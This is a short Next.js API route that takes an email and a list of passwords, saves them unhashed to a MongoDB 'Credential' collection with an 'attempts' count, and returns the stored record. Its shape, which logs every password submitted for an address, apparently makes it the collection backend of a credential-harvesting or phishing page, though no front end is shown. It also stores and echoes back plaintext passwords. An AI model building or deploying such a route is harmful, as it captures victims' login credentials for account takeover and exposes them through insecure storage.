import { connectToDatabase } from '@/lib/mongodb';
import { Credential } from '@/models/Credential';
import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const { email, passwords } = await request.json();
    
    await connectToDatabase();
    
    const credential = await Credential.create({
      email,
      passwords,
      attempts: passwords.length
    });

    return NextResponse.json({ success: true, data: credential });
  } catch (error) {
    console.error('Database Error:', error);
    return NextResponse.json(
      { success: false, error: 'Failed to save credentials' },
      { status: 500 }
    );
  }
} 